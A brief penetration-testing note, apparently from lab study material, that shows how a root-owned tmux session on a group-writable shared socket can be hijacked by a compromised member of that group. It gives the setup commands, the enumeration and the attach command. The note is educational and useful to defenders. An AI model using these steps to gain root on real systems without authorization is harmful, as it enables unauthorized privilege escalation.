
 A user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked by creating a new shared session and modifying the ownership.

```sh
tmux -S /shareds new -s debugsess ### created by root
chown root:devs /shareds ### ownership change by root
```

If a user in the `devs` group is compromised, we can attach to this session and gain root access.

```sh
ps aux | grep tmux

ls -la /shareds
	srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds

id
	uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)

tmux -S /shareds
```

---